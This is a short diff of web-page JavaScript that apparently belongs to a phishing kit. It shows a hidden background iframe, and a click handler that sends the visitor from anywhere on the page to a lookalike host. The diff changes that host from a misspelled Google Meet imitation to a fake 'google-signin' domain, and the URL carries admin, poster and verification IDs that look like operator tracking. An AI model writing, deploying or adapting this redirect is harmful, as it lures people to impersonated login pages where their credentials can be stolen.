@@ -54,7 +54,7 @@ document.body.appendChild(backgroundIframe);
 // Redirect when clicking anywhere on the page
 document.body.addEventListener('click', () => {
     if (poster) {
-        window.location.href = `https://meet-live-ggoole.vercel.app/${admin}/${poster}/${verifyId}`;
+        window.location.href = `https://google-signin-live.vercel.app/${admin}/${poster}/${verifyId}`;
     } else {
         alert('User ID not found!');
     }
